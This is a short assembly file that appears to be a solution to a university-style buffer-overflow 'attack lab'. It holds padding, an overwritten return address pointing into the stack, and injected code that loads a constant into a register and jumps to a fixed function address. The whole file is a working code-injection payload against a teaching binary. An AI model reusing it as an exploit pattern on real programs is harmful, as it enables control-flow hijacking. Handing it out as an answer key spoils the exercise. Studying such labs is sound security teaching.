BASE = 0x5561dc78

stack:
  .ascii "0123456789012345678901234567890123456789"
  .quad (BASE + main - stack)

main:
  movl $0x59b997fa, %edi
  push $0x4017ec
  ret
